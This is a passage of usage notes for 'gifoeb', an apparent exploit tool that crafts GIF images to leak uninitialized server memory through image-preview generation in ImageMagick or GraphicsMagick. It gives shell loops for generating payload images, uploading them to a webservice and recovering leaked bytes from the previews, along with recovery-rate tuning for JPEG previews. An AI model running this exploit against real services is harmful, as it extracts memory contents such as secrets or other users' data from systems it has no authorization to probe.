
```
python3 rsvgeb.py gen 260x260 --format bmp zalupa.png


How to use

Run ./gifoeb gen 512x512 dump.gif. The script needs ImageMagick (default) or GraphicsMagick (use --tool GM) to generate the images.

Upload dump.gif somewhere. If the following conditions hold true

A preview is generated
It is preferably not a JPEG (see notes)
It changes significantly from one upload to another
then you're lucky.

Download and save the preview as preview.ext.

r=$(identify -format '%wx%h' preview.ext[0]) &&
mkdir -p for_upload &&
for i in `seq 1 10`; do
   ./gifoeb gen $r for_upload/$i.gif;
done
Upload for_upload/*.gif to the webservice and download the previews.

  for p in previews/*; do
    ./gifoeb recover $p | strings;
  done
Repeat 4-6 until you get something interesting or tired.

Notes on JPEG previews

Unfortunately, conversion to JPEG corrupts the palette at the very first stage --- RGB->YCbCr conversion. All other stages almost don't cause information loss if the picture consists of 16x16 squares of one color and the JPEG conversion quality >= 75. You can still try gifoeb recover on JPEG images, but only ~60% bytes will be recovered accurately and others will be recovered with +-1 error.

You can play with image generation and palette recovery alogirithms (see functions gen_picture and recovery in gifoeb). Test it ./gifoeb recover_test --format jpg, like this:

$ ./gifoeb recover_test --format jpg 300x300
test completed, 768 bytes total, 228 recovered wrong (29.69%)
If the resolution of the preview is less than 256x256 then we can't fit all 256 squares and gifoeb gen will generate squares of smaller size, so the recover success rate will be even lower. In this case, try to reduce number of colors in the palette (a.k.a number of dumped bytes / 3) using --colors switch (supply same value to gifoeb gen and gifoeb recover!). To find the best value use recover_test:

$ ./gifoeb recover_test 100x100 --format jpg --colors 145
test completed, 435 bytes total, 307 recovered wrong (70.57%)
$ ./gifoeb recover_test 100x100 --format jpg --colors 144
test completed, 432 bytes total, 134 recovered wrong (31.02%)


```
